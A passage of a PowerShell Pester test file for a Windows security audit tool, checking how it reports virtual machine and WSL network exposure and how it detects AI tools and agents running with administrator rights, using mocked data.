                -Listeners @([pscustomobject]@{ Product = 'WSL'; Process = 'wslrelay'; Address = '127.0.0.1'; Port = 3000; Exposed = $false }) -WslNetworking 'nat')
            $f = @(& $script:run 'FW-07')
            $f[0].Status | Should -Be 'Pass'
            @($f[0].Evidence) | Should -Contain 'Listener: WSL (wslrelay) 127.0.0.1:3000'
        }

        It 'reports VM files it found but did not read, rather than no virtual machines' {
            # As a SYSTEM or elevated audit reports a VM behind a junction, or over maxVmFilesPerInventory.
            $link = New-TestNotRead
            $cap = New-TestNotRead -Location '%USERPROFILE%\.VirtualBox\VirtualBox.xml' -Reason 'the audit reads at most 64 virtual machine files named in one inventory above the user''s rights' -Remedy 'Or raise maxVmFilesPerInventory in virtualisation.json.'
            Set-TestVirt (New-TestVirtState -NotRead @($link, $cap))
            $f = @(& $script:run 'FW-07')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Manual'
            $f[0].Actual | Should -Match '^2 location\(s\) could not be read, so a virtual machine that was not read may use bridged networking or publish ports: %USERPROFILE%\\VMs\\lab\\lab\.vmx \(file not read\)'
            @($f[0].Evidence).Count | Should -Be 2
            # FW-07 is a Machine-scope check the per-user probe does not run: only a full audit in the user's own session checks it.
            $f[0].Recommendation | Should -Not -Match 'Invoke-CEUserProbe'
            $f[0].Recommendation | Should -Not -Match 'per-user probe'
            $f[0].Recommendation | Should -Match 'full audit without elevation while signed in as that user \(app\\Invoke-CEAudit\.ps1'
            $f[0].Recommendation | Should -Match 'maxVmFilesPerInventory'
            # Next to a VM that was read and is not exposed it is not a Pass either: the unread one may be bridged.
            Set-TestVirt (New-TestVirtState -VMware @([pscustomobject]@{ Name = 'Dev'; Networks = @('nat'); SharedFolders = @() }) -NotRead @($link))
            $f = @(& $script:run 'FW-07')
            @($f | ForEach-Object Status) | Should -Be @('Manual')
            # A bridged VM that was read is still a warning, next to the Manual.
            Set-TestVirt (New-TestVirtState -VMware @([pscustomobject]@{ Name = 'Dev'; Networks = @('bridged'); SharedFolders = @() }) -NotRead @($link))
            $f = @(& $script:run 'FW-07')
            @($f | ForEach-Object Status) | Should -Be @('Warn', 'Manual')
            @((& $script:sub $f 'Bridged networking').Evidence) | Should -Contain '%USERPROFILE%\VMs\lab\lab.vmx (file not read): a junction or symbolic link on the way is not followed when reading file contents above the user''s rights'
            # .wslconfig matters only when there are WSL distributions for it to configure.
            $wslconfig = New-TestNotRead -Location '%USERPROFILE%\.wslconfig' -Topic 'wslconfig'
            Set-TestVirt (New-TestVirtState -NotRead @($wslconfig))
            (@(& $script:run 'FW-07'))[0].Status | Should -Be 'NotApplicable'
            Set-TestVirt (New-TestVirtState -NotRead @($wslconfig) -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $false; AutomountSource = ''; Tooling = $false }))
            (@(& $script:run 'FW-07'))[0].Status | Should -Be 'Manual' -Because 'the networking mode of a WSL distribution was not read'
        }

        It 'is Manual, never Not applicable or a Pass, when Hyper-V could not be listed, and says to list it elevated' {
            # An audit without elevation, the one the profile remedy asks for, cannot list Hyper-V virtual machines.
            $p = Join-Path $TestDrive 'fw07-hyperv-profile'
            New-Item -ItemType Directory -Force -Path $p | Out-Null
            $st = InModuleScope CEAudit -Parameters @{ P = $p } {
                param($P)
                $script:testHvProfile = $P
                Mock Get-CEUserProfilePath { $script:testHvProfile }
                Mock Get-CEWslDistribution { , @() }
                Mock Get-CEContainer { , @() }
                Mock Get-CEVirtualisationListener { , @() }
                Mock Get-Service { [pscustomobject]@{ Name = 'vmms'; Status = 'Running' } }
                Mock Resolve-CEDockerPath { [pscustomobject]@{ Path = ''; Refused = @() } }
                Mock Get-Command { [pscustomobject]@{ Name = 'Get-VM' } }
                Mock Get-VMSwitch { throw 'The operation failed on C:\ProgramData\Microsoft\Windows\Hyper-V' }
                $ctx = { param([bool]$Elevated) [pscustomobject]@{ ComputerName = 'HV'; AuditTime = (Get-Date); IsElevated = $Elevated; IsSystem = $false; ConsoleUserSid = $null } }
                [pscustomobject]@{ User = Get-CEVirtualisationStateUncached -Context (& $ctx $false); Failed = Get-CEVirtualisationStateUncached -Context (& $ctx $true) }
            }
            $rec = 'hyperv|Hyper-V virtual machines|existence|an audit without elevation cannot list them|False'
            @($st.User.NotRead | ForEach-Object { "$($_.Topic)|$($_.Location)|$($_.Kind)|$($_.Reason)|$($_.NeedsUserSession)" }) | Should -Be @($rec)
            @($st.User.Notes).Count | Should -Be 0 -Because 'it is a not-read record, not a note FW-07 would pass with'
            Set-TestVirt $st.User
            $f = @(& $script:run 'FW-07')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Manual'
            $f[0].Subject | Should -Be 'Not read'
            @($f[0].Evidence) | Should -Be @('Hyper-V virtual machines (not checked): an audit without elevation cannot list them')
            $f[0].Recommendation | Should -Match 'elevated prompt \(Get-VM'
            $f[0].Recommendation | Should -Match 'run the audit elevated'
            $f[0].Recommendation | Should -Not -Match 'without elevation while signed in' -Because 'a run without elevation cannot list them'
            # Next to a VM that was read and is not exposed it is not a Pass either.
            $st.User.VMware = @([pscustomobject]@{ Name = 'Dev'; Networks = @('nat'); SharedFolders = @() })
            @(& $script:run 'FW-07' | ForEach-Object Status) | Should -Be @('Manual')
            # SC-12 keeps its Info note, with its own advice, and does not depend on the record.
            Set-TestVirt $st.User
            $st.User.VMware = @()
            $sc = @(& $script:run 'SC-12')
            @($sc | ForEach-Object Status) | Should -Be @('Info')
            $sc[0].Actual | Should -Match 'need elevation to list'
            # An elevated audit that fails to list them: a fixed reason, never the error's text.
            @($st.Failed.NotRead | ForEach-Object { "$($_.Topic)|$($_.Reason)" }) | Should -Be @('hyperv|it could not be read (RuntimeException)')
            ($st.Failed | ConvertTo-Json -Depth 6) | Should -Not -Match 'ProgramData'
            Set-TestVirt $st.Failed
            $f = @(& $script:run 'FW-07')
            @($f | ForEach-Object Status) | Should -Be @('Manual')
            $f[0].Recommendation | Should -Match 'Virtual Machine Management service'
            # Hyper-V that can be listed, with nothing on it, is still Not applicable.
            Set-TestVirt (New-TestVirtState)
            (@(& $script:run 'FW-07'))[0].Status | Should -Be 'NotApplicable'
        }

        It 'warns about bridged networking from every source' {
            Set-TestVirt (New-TestVirtState `
                -HyperV @([pscustomobject]@{ Name = 'Server'; State = 'Running'; ExternalSwitches = @('External LAN') }) `
                -VMware @([pscustomobject]@{ Name = 'Lab'; Networks = @('nat', 'bridged'); SharedFolders = @() }) `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 1; SharedFolders = @(); PortForwards = @() }) `
                -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $false; AutomountSource = ''; Tooling = $false }) -WslNetworking 'mirrored')
            $warn = & $script:sub (& $script:run 'FW-07') 'Bridged networking'
            $warn.Status | Should -Be 'Warn'
            $warn.Actual | Should -Be "Hyper-V 'Server' on external switch External LAN; VMware 'Lab' uses bridged networking; VirtualBox 'Kali' uses bridged networking; WSL uses mirrored networking (.wslconfig)"
        }

        It 'warns about ports published to the network, not ones bound to loopback' {
            Set-TestVirt (New-TestVirtState `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 0; SharedFolders = @(); PortForwards = @(
                    [pscustomobject]@{ Name = 'ssh'; Protocol = 'tcp'; HostIp = ''; HostPort = '2222'; Exposed = $true },
                    [pscustomobject]@{ Name = 'web'; Protocol = 'tcp'; HostIp = '127.0.0.1'; HostPort = '8080'; Exposed = $false }) }) `
                -Nat @('TCP 0.0.0.0:3389 -> 172.20.0.5:3389', 'TCP 192.168.1.10:80 -> 172.20.0.6:80') `
                -Containers @([pscustomobject]@{ Name = 'web'; Image = 'nginx'; Ports = '0.0.0.0:8080->80/tcp, [::]:8080->80/tcp' }, [pscustomobject]@{ Name = 'db'; Image = 'postgres'; Ports = '127.0.0.1:5432->5432/tcp' }) `
                -Listeners @([pscustomobject]@{ Product = 'Docker Desktop'; Process = 'com.docker.backend'; Address = '0.0.0.0'; Port = 8080; Exposed = $true },
                             [pscustomobject]@{ Product = 'Docker Desktop'; Process = 'com.docker.backend'; Address = '127.0.0.1'; Port = 5432; Exposed = $false }))
            $f = @(& $script:run 'FW-07')
            @(& $script:sub $f 'Bridged networking').Count | Should -Be 0
            $warn = & $script:sub $f 'Published ports'
            $warn.Status | Should -Be 'Warn'
            $warn.Actual | Should -Be "Docker Desktop (com.docker.backend) listening on 0.0.0.0:8080; VirtualBox 'Kali' forwards tcp port 2222 on all interfaces; Hyper-V NAT mapping TCP 0.0.0.0:3389 -> 172.20.0.5:3389; Container 'web' publishes 0.0.0.0:8080->80/tcp, [::]:8080->80/tcp"
            $warn.Recommendation | Should -Match '127\.0\.0\.1'
        }
    }
}

Describe 'AI tools (UA-07, SC-09, UA-10)' {
    BeforeAll {
        function global:New-TestAITool {
            param([string]$Name, [string]$Service = 'Anthropic (Claude)', [bool]$CanAct = $true, [object[]]$Processes = @(), [string]$Id)
            if (-not $Id) { $Id = ($Name.ToLower() -replace '[^a-z0-9]+', '-') }
            [pscustomobject]@{ Id = $Id; Name = $Name; Service = $Service; CanActOnDevice = $CanAct; Notes = ''
                Signals = @("Store app: $Name"); Processes = $Processes }
        }
        function global:New-TestAgentProcess {
            param([int]$ProcessId, [string]$Image = 'claude.exe', $Elevated = $false, [string]$Owner = 'PC\paul')
            [pscustomobject]@{ ProcessId = $ProcessId; Image = $Image; Path = "C:\x\$Image"; Owner = $Owner; AsSystem = ($Owner -eq 'NT AUTHORITY\SYSTEM'); Elevated = $Elevated }
        }
        function global:Set-TestAITools {
            param([object[]]$Tools = @(), [string[]]$Uninspected = @(), [object[]]$NotRead = @())
            Set-TestDevice -Kind Secure
            $global:CETestAI = [pscustomobject]@{ Tools = $Tools; UninspectedProcesses = $Uninspected; NotRead = @($NotRead) }
            Mock -ModuleName CEAudit Get-CEAIToolState { $global:CETestAI }
        }
        function global:Use-TestSymlinkTag {
            # Makes the real junctions named in Paths look like symbolic links (tag 0xA000000C) to the module: this
            # account can't create symbolic links. Every other path gets its real tag (Pester 6 mocks have no fallback).
            param([string[]]$Paths)
            $tags = @{}
            foreach ($p in @($Paths)) { $tags[[string]$p] = [Convert]::ToInt64('A000000C', 16) }
            Use-TestTags $tags
        }
    }

    It 'the sandbox install catalogue is an overlay of the shipped tool list (same ids, no duplicated identity)' {
        # config/ai-tools.json is the one place a tool is defined. sandbox/tools.json only says how the lab
        # installs it. Ids must agree both ways so a rule cannot exist without a way to test it, and the
        # overlay must not restate identity that could drift from the rules.
        $rules = @((Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw | ConvertFrom-Json).tools)
        $lab = @((Get-Content (Join-Path $script:RepoRoot 'sandbox\tools.json') -Raw | ConvertFrom-Json).tools)
        $isHelper = { param($t) [bool]($t.PSObject.Properties['helper'] -and $t.helper) }
        $labIds = @($lab | Where-Object { -not (& $isHelper $_) } | ForEach-Object id | Sort-Object)
        $ruleIds = @($rules | ForEach-Object id | Sort-Object)
        @($ruleIds | Where-Object { $labIds -notcontains $_ }) -join ', ' | Should -BeNullOrEmpty -Because 'every detection rule needs a lab entry (a recipe, or manual: true with a reason)'
        @($labIds | Where-Object { $ruleIds -notcontains $_ }) -join ', ' | Should -BeNullOrEmpty -Because 'the lab cannot install a tool the rules do not know'
        foreach ($t in $lab) {
            if (& $isHelper $t) { continue }
            $t.PSObject.Properties['name'] | Should -BeNullOrEmpty -Because "$($t.id): identity belongs in config/ai-tools.json"
            $manual = [bool]($t.PSObject.Properties['manual'] -and $t.manual)
            if ($manual) { [string]$t.reason | Should -Not -BeNullOrEmpty -Because "$($t.id) is manual and must say why" }
            else { [string]$t.install.type | Should -BeIn @('winget', 'script', 'npm', 'vscode') -Because $t.id }
        }
    }

    It 'the shipped tool list is well formed' {
        $list = Get-Content (Join-Path (Join-Path $script:RepoRoot 'config') 'ai-tools.json') -Raw | ConvertFrom-Json
        $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
        $list.schemaVersion | Should -Be 2
        $ids = @($list.tools | ForEach-Object { $_.id })
        ($ids | Sort-Object -Unique).Count | Should -Be $ids.Count
        # @($null).Count is 1, so count only properties that are there.
        $items = { param($o, [string]$n) if ($null -eq $o) { return , @() }; $p = $o.PSObject.Properties[$n]; if ($p -and $null -ne $p.Value) { return , @($p.Value) }; return , @() }
        $idPattern = @{ chrome = '^[a-p]{32}$'; edge = '^[a-p]{32}$'; opera = '^[a-p]{32}$'
            firefox = '^(\{[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\}|[A-Za-z0-9._+-]{1,80}@[A-Za-z0-9.-]{1,80})$' }
        $extIds = @()
        foreach ($t in @($list.tools)) {
            # Detection signals live in a block per operating system; nothing Windows-specific at the top level.
            foreach ($legacy in 'programs', 'uninstallKeys', 'appx', 'processes', 'paths', 'vscodeExtensions', 'mcpConfigs', 'enabled') {
                $t.PSObject.Properties[$legacy] | Should -BeNullOrEmpty -Because "$($t.id): $legacy belongs in the windows block"
            }
            # Browser extension ids are the same on every operating system, so they are shared, at the top level.
            $exts = & $items $t 'browserExtensions'
            $wProp = $t.PSObject.Properties['windows']
            $w = if ($wProp) { $wProp.Value } else { $null }
            ($null -ne $w -or $exts.Count -gt 0) | Should -BeTrue -Because "$($t.id) needs a windows block or browserExtensions"
            $signals = $exts.Count
            foreach ($n in 'programs', 'uninstallKeys', 'appx', 'processes', 'paths', 'vscodeExtensions') { $signals += (& $items $w $n).Count }
            $signals | Should -BeGreaterThan 0 -Because $t.id
            foreach ($e in $exts) {
                [string]$e.store | Should -BeIn @('chrome', 'edge', 'opera', 'firefox') -Because $t.id
                [string]$e.id | Should -Match $idPattern[[string]$e.store] -Because "$($t.id): $($e.store) id"
                ([string]$e.id).Length | Should -BeLessOrEqual 128 -Because $t.id
                $extIds += $(if ($e.store -eq 'firefox') { [string]$e.id } else { ([string]$e.id).ToLowerInvariant() })
            }
            foreach ($proc in (& $items $w 'processes')) { $proc.image | Should -Match '^[\w. -]+\.exe$' -Because $t.id }
            foreach ($prog in (& $items $w 'programs')) { ($prog.name -replace '[*?]', '').Length | Should -BeGreaterOrEqual 4 -Because "$($t.id) program pattern must not be too broad" }
            @($t.sources).Count | Should -BeGreaterThan 0 -Because $t.id
            foreach ($u in @($t.sources)) { $u | Should -Match '^https://' -Because $t.id }
        }
        @($extIds | Group-Object | Where-Object Count -gt 1 | ForEach-Object Name) -join ', ' | Should -BeNullOrEmpty -Because 'an extension id belongs to one tool'
    }

    It 'detects tools from programs, Store apps, profile folders, extensions and processes' {
        $profileDir = Join-Path $TestDrive 'ai-profile'
        New-Item -ItemType Directory -Force -Path (Join-Path $profileDir '.gemini'), (Join-Path $profileDir '.vscode\extensions\github.copilot-chat-0.30.0'), (Join-Path $profileDir '.vscode\extensions\github.copilot-1.350.0'),
            (Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions\copilot') | Out-Null
        # VS Code 1.13x: the app sits in a commit-hash folder (any name; it changes every release and the
        # module enumerates whatever is there) and ships Copilot Chat as a built-in whose folder is just
        # "copilot"; its package.json carries the real identity.
        Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions\copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub", "version": "0.66.0" }' -Encoding ASCII
        $builtInDir = Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions'
        Mock -ModuleName CEAudit Get-CEVsCodeBuiltInExtensionDir { , @($builtInDir) }.GetNewClosure()
        InModuleScope CEAudit -Parameters @{ P = $profileDir } {
            param($P)
            $script:aiProfile = $P
            # The shipped catalog plus a browser that can't act on the device, which runs many processes.
            $orig = (Get-CEConfig).'ai-tools'
            (Get-CEConfig).'ai-tools' = [pscustomobject]@{ schemaVersion = 2; tools = @(@($orig.tools) + @(
                [pscustomobject]@{ id = 't-browser'; name = 'Browser Y'; canActOnDevice = $false; windows = [pscustomobject]@{ processes = @([pscustomobject]@{ image = 'browsx.exe'; path = '*\Browser Y\*' }) } })) }
            try {
                Mock Get-CEUserProfilePath { $script:aiProfile }
                Mock Get-CEInstalledSoftware {
                    @([pscustomobject]@{ Name = 'Cursor (User)'; Version = '1.6'; Publisher = 'Anysphere'; KeyName = '{DADADADA}_is1' },
                      [pscustomobject]@{ Name = 'Cursor Themes Pack'; Version = '2'; Publisher = 'Somebody else'; KeyName = 'x' },
                      [pscustomobject]@{ Name = 'Ollama version 0.34.1'; Version = '0.34.1'; Publisher = 'Ollama'; KeyName = '{44E8}_is1' })
                }
                Mock Get-CEStorePackageName { @('Claude', 'Microsoft.Copilot', 'Microsoft.WindowsCalculator') }
                Mock Get-CEProcessList {
                    @([pscustomobject]@{ Name = 'claude.exe'; ProcessId = 10; Path = 'C:\Program Files\WindowsApps\Claude_2.1_x64__pzs8sxrjxfjjc\app\claude.exe'; CommandLine = 'claude.exe'; Cim = $null },
                      [pscustomobject]@{ Name = 'claude.exe'; ProcessId = 20; Path = 'C:\Users\paul\.local\bin\claude.exe'; CommandLine = 'claude'; Cim = $null },
                      [pscustomobject]@{ Name = 'claude.exe'; ProcessId = 30; Path = ''; CommandLine = ''; Cim = $null },
                      [pscustomobject]@{ Name = 'node.exe'; ProcessId = 40; Path = 'C:\nodejs\node.exe'; CommandLine = 'node C:\npm\node_modules\@google\gemini-cli\bundle\gemini.js'; Cim = $null },
                      [pscustomobject]@{ Name = 'node.exe'; ProcessId = 50; Path = ''; CommandLine = ''; Cim = $null },
                      [pscustomobject]@{ Name = 'copilot.exe'; ProcessId = 60; Path = 'C:\Tools\SomethingElse\copilot.exe'; CommandLine = 'copilot'; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 70; Path = 'C:\Apps\Browser Y\browsx.exe'; CommandLine = 'browsx'; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 71; Path = 'C:\Apps\Browser Y\browsx.exe'; CommandLine = 'browsx --type=renderer'; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 72; Path = 'C:\Apps\Browser Y\browsx.exe'; CommandLine = 'browsx --type=gpu'; Cim = $null })
                }
                Mock Get-CEProcessOwner { 'PC\paul' }
                Mock Get-CEProcessElevation { if ($ProcessId -eq 20) { 1 } else { 0 } }
                $st = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false })
                $byId = @{}
                foreach ($t in $st.Tools) { $byId[$t.Id] = $t }
                @($byId.Keys | Sort-Object) | Should -Be @('claude-code', 'claude-desktop', 'cursor', 'gemini-cli', 'github-copilot-vscode', 'ollama', 't-browser')
                $byId['claude-desktop'].Processes.ProcessId | Should -Be 10
                $byId['claude-desktop'].Signals | Should -Contain 'Running: claude.exe (pid 10)'
                $byId['t-browser'].Signals | Should -Be @('Running: browsx.exe (3 processes)') -Because 'a tool that cannot act on the device has its processes counted, not listed'
                $byId['claude-code'].Processes.ProcessId | Should -Be 20 -Because 'claude.exe is told apart by path'
                $byId['claude-code'].Processes[0].Elevated | Should -BeTrue
                $byId['cursor'].Signals | Should -Contain 'Installed program: Cursor (User) 1.6'
                $byId['ollama'].Signals | Should -Contain 'Installed program: Ollama version 0.34.1'
                @($byId['ollama'].Processes).Count | Should -Be 0
                $byId['github-copilot-vscode'].Signals | Should -Be @('VS Code extension: github.copilot-chat-0.30.0', 'VS Code built-in extension: github.copilot-chat', 'VS Code extension: github.copilot-1.350.0')
                $byId['gemini-cli'].Signals | Should -Contain 'Found %USERPROFILE%\.gemini'
                $st.UninspectedProcesses | Should -Be @('claude.exe (pid 30)') -Because 'node.exe and unrelated copilot.exe are not reported'
                Should -Invoke Get-CEProcessOwner -Times 0 -ParameterFilter { $Process.ProcessId -eq 60 }
            }
            finally { (Get-CEConfig).'ai-tools' = $orig }
        }
    }

    It 'reports unreadable processes only for tools that can act on the device' {
        # A browser or chat app whose process can't be read is not a possible hidden agent (UA-10).
        InModuleScope CEAudit {
            $orig = (Get-CEConfig).'ai-tools'
            try {
                (Get-CEConfig).'ai-tools' = [pscustomobject]@{ schemaVersion = 2; tools = @(
                    [pscustomobject]@{ id = 't-agent'; name = 'Agent X'; canActOnDevice = $true; windows = [pscustomobject]@{ processes = @([pscustomobject]@{ image = 'agentx.exe'; path = '*\x\*' }) } },
                    [pscustomobject]@{ id = 't-browser'; name = 'Browser Y'; canActOnDevice = $false; windows = [pscustomobject]@{ processes = @([pscustomobject]@{ image = 'browsx.exe'; path = '*\y\*' }) } }) }
                Mock Get-CEUserProfilePath { $null }
                Mock Get-CEInstalledSoftware { @() }
                Mock Get-CEStorePackageName { , @() }
                Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
                Mock Get-CEProcessList {
                    @([pscustomobject]@{ Name = 'agentx.exe'; ProcessId = 1; Path = ''; CommandLine = ''; Cim = $null },
                      [pscustomobject]@{ Name = 'browsx.exe'; ProcessId = 2; Path = ''; CommandLine = ''; Cim = $null })
                }
                $st = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false })
                @($st.UninspectedProcesses) | Should -Be @('agentx.exe (pid 1)')
            }
            finally { (Get-CEConfig).'ai-tools' = $orig }
        }
    }

    It 'SC-09 warns about agents that can act on the device, not local or chat-only tools' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude desktop app'), (New-TestAITool 'Ollama' -Service '' -CanAct $false))
        $f = @(Invoke-CEAuditCore -Id 'SC-09')
        $warn = @($f | Where-Object { $_.Subject -eq 'Claude desktop app' })
        $warn.Status | Should -Be 'Warn'
        $warn.Actual | Should -Be 'AI agent that can act on this device: Claude desktop app'
        $warn.Recommendation | Should -Match 'MFA'
        @($f | Where-Object { $_.Subject -eq 'Ollama' }).Count | Should -Be 0
    }

    It 'UA-07 asks for MFA on the accounts AI tools use' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude desktop app'), (New-TestAITool 'Cursor' -Service 'Cursor'), (New-TestAITool 'Ollama' -Service '' -CanAct $false))
        $f = @(Invoke-CEAuditCore -Id 'UA-07')
        ($f | Where-Object Subject -eq 'Anthropic (Claude)').Actual | Should -Match 'detected via: Claude desktop app'
        ($f | Where-Object Subject -eq 'Cursor').Status | Should -Be 'Manual'
        @($f | Where-Object Subject -eq '').Count | Should -Be 0
    }

    It 'UA-10: not applicable, pass, warn when elevated or SYSTEM, manual when it cannot tell' {
        Set-TestAITools -Tools @(New-TestAITool 'Ollama' -Service '' -CanAct $false)
        (@(Invoke-CEAuditCore -Id 'UA-10'))[0].Status | Should -Be 'NotApplicable'

        Set-TestAITools -Tools @(New-TestAITool 'Claude Code')
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'none running at the time of the audit'

        Set-TestAITools -Tools @((New-TestAITool 'Claude Code' -Processes @((New-TestAgentProcess 20 -Elevated $true), (New-TestAgentProcess 21))),
                                 (New-TestAITool 'Cursor' -Service 'Cursor' -Processes @(New-TestAgentProcess 22 'Cursor.exe' $null 'NT AUTHORITY\SYSTEM')))
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Warn'
        $f[0].Actual | Should -Be 'Running with administrator rights: Claude Code: claude.exe pid 20 as PC\paul; Cursor: Cursor.exe pid 22 as NT AUTHORITY\SYSTEM'

        Set-TestAITools -Tools @(New-TestAITool 'Claude Code' -Processes @(New-TestAgentProcess 20 -Elevated $null)) -Uninspected @('claude.exe (pid 30)')
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Be "Couldn't check: Claude Code: claude.exe pid 20 as PC\paul; Possible AI agent claude.exe (pid 30) (path not readable)"
    }

    It 'reads Windows signals from the windows block, and from the top level in older overrides' {
        InModuleScope CEAudit {
            $orig = (Get-CEConfig).'ai-tools'
            try {
                (Get-CEConfig).'ai-tools' = [pscustomobject]@{ tools = @(
                    [pscustomobject]@{ id = 'grouped'; windows = [pscustomobject]@{ paths = @('.grouped') } },
                    [pscustomobject]@{ id = 'off-here'; windows = [pscustomobject]@{ enabled = $false; paths = @('.off') } },
                    [pscustomobject]@{ id = 'mac-only'; macos = [pscustomobject]@{ paths = @('.mac') } },
                    [pscustomobject]@{ id = 'flat'; paths = @('.flat'); mcpConfigs = @([pscustomobject]@{ path = '.flat.json' }) },
                    [pscustomobject]@{ id = 'ext-only'; browserExtensions = @([pscustomobject]@{ store = 'chrome'; id = 'fcoeoabgfenejglbffodgkkbkcdhcgfn' }) },
                    [pscustomobject]@{ id = 'ext-off'; windows = [pscustomobject]@{ enabled = $false }; browserExtensions = @([pscustomobject]@{ store = 'chrome'; id = 'hehggadaopoacecdllhhajmbjkdcmajg' }) },
                    [pscustomobject]@{ id = 'both'; windows = [pscustomobject]@{ paths = @('.both') }; browserExtensions = @([pscustomobject]@{ store = 'firefox'; id = 'support@wordtune.com' }) }) }
                $catalog = Get-CEAIToolCatalog
                @($catalog | ForEach-Object { $_.Tool.id }) | Should -Be @('grouped', 'flat', 'ext-only', 'both') -Because 'enabled: false turns off extensions too'
                @($catalog[0].Signals.paths) | Should -Be @('.grouped')
                @($catalog[1].Signals.paths) | Should -Be @('.flat') -Because 'an override written before signals were grouped still works'
                @($catalog[2].Signals.PSObject.Properties).Count | Should -Be 0 -Because 'a tool found only by its browser extensions has no Windows signals'
                $ids = Get-CEBrowserExtensionIdSet -Catalog $catalog
                @($ids.Chromium.Keys) | Should -Be @('fcoeoabgfenejglbffodgkkbkcdhcgfn')
                @($ids.Firefox.Keys) | Should -Be @('support@wordtune.com')
                $mcp = Get-CEMcpConfigCatalogue
                @($mcp | ForEach-Object { $_.ToolId }) | Should -Be @('flat')

                # A v2 override with no browserExtensions anywhere still reads.
                (Get-CEConfig).'ai-tools' = [pscustomobject]@{ schemaVersion = 2; tools = @([pscustomobject]@{ id = 'grouped'; name = 'Grouped'; windows = [pscustomobject]@{ paths = @('.grouped') } }) }
                Mock Get-CEUserProfilePath { $null }
                Mock Get-CEInstalledSoftware { @() }
                Mock Get-CEStorePackageName { , @() }
                Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
                Mock Get-CEProcessList { , @() }
                { Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false }) } | Should -Not -Throw
            }
            finally { (Get-CEConfig).'ai-tools' = $orig }
        }
    }

    It 'SC-09 warns about every agent that can act on the device' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude Code' -Id 'claude-code'), (New-TestAITool 'Cursor' -Service 'Cursor' -Id 'cursor'))
        $f = @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object { $_.Subject -in 'Claude Code', 'Cursor' })
        $f.Count | Should -Be 2
        foreach ($x in $f) { $x.Status | Should -Be 'Warn' }
    }

    It 'reports how many AI tools it found, what it cannot see, and names what the paid tier adds' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude Code' -Id 'claude-code'), (New-TestAITool 'Cursor' -Service 'Cursor' -Id 'cursor'))
        $r = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-09') -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'ai-report')
        $md = Get-Content $r.Paths.Markdown -Raw
        $html = Get-Content $r.Paths.Html -Raw
        $md | Should -Match ([regex]::Escape('**2 AI tools found**'))
        $md | Should -Match ([regex]::Escape('- Claude Code - present'))
        $md | Should -Match ([regex]::Escape("Baseline finds recognised AI apps and browser extensions installed on this device. It can't see AI websites used in a browser tab."))
        $md | Should -Match 'approved, across all its devices, is part of the Engramic Baseline paid tier\.'
        $html | Should -Match ([regex]::Escape('<strong>2 AI tools found</strong>'))
        $html | Should -Match ([regex]::Escape("Baseline finds recognised AI apps and browser extensions installed on this device. It can't see AI websites used in a browser tab."))
        $html | Should -Match 'is part of the Engramic Baseline paid tier\.</p>'
        foreach ($text in $md, $html) { $text | Should -Not -Match '[Uu]pgrade' }

        Set-TestAITools -Tools @(New-TestAITool 'Claude Code' -Id 'claude-code')
        $r = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-09') -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'ai-report-1')
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('**1 AI tool found**'))

        Set-TestAITools -Tools @()
        $r = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-09') -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'ai-report-0')
        $md = Get-Content $r.Paths.Markdown -Raw
        $md | Should -Match ([regex]::Escape('**0 AI tools found**'))
        $md | Should -Not -Match 'paid tier' -Because 'the note only follows a list of tools'
        (Get-Content $r.Paths.Html -Raw) | Should -Not -Match 'paid tier'
    }

    Context 'AI browser extensions' {
        BeforeAll {
            $global:CEOrigBrowserConfig = InModuleScope CEAudit { @{ Tools = (Get-CEConfig)['ai-tools']; Browsers = (Get-CEConfig)['browser-profiles'] } }
            $global:CETestExtId = @{ Claude = 'fcoeoabgfenejglbffodgkkbkcdhcgfn'; ChatGpt = 'hehggadaopoacecdllhhajmbjkdcmajg'; ChatGptEdge = 'odlomjlbamekndcpllcnffbgeohgkmjh'
                Other = 'cjpalhdlnbpafiamejdnhcphjbkeiagm'; Early = ('a' * 32) }
            # Tools found only by their browser extensions, with real store ids.
            $global:CETestExtTools = @"
{ "schemaVersion": 2, "tools": [
  { "id": "t-claude", "name": "Claude test", "service": "Anthropic (Claude)", "canActOnDevice": false,
